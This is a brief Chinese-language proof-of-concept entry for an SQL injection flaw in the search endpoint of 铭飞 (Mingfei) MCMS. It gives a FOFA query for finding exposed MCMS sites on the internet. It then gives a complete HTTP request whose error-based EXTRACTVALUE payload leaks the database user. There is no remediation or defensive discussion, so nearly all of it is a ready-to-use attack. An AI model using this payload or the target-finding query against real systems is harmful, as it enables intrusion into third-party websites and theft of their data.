## 铭飞CMS-search接口存在sql注入漏洞 



## fofa

```
body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
```



## poc

```
GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,md5(8789),user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

